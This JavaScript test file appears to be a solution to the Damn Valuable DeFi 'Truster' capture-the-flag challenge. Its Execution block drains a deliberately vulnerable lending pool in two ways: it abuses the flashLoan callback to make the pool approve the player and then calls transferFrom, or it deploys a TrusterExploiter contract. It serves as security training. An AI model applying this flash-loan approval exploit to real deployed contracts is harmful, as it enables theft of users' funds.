const { ethers } = require('hardhat');
const { expect } = require('chai');

// 0 -> 2 TX solution
// 1 -> 1 TX solution (using a dedicated smart contract)
const solutionSwitch = 1;

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        if (solutionSwitch === 0)
        {
            /** 2 TX no smart contract Solution **/
            let intr = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
            let data = intr.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);

            await pool.connect(player).flashLoan(0, player.address, token.address, data); // TX 1: setting approval for later

            await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL); // TX 2: stealing tokens
        }
        else if (solutionSwitch === 1)
        {
            /** 1 TX + SMART CONTRACT Solution **/
            let trusterExploiterFactory = await ethers.getContractFactory("TrusterExploiter", player);
            let trusterExploiter = await trusterExploiterFactory.deploy(token.address, pool.address, player.address);

            await trusterExploiter.connect(player).attack(TOKENS_IN_POOL);
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

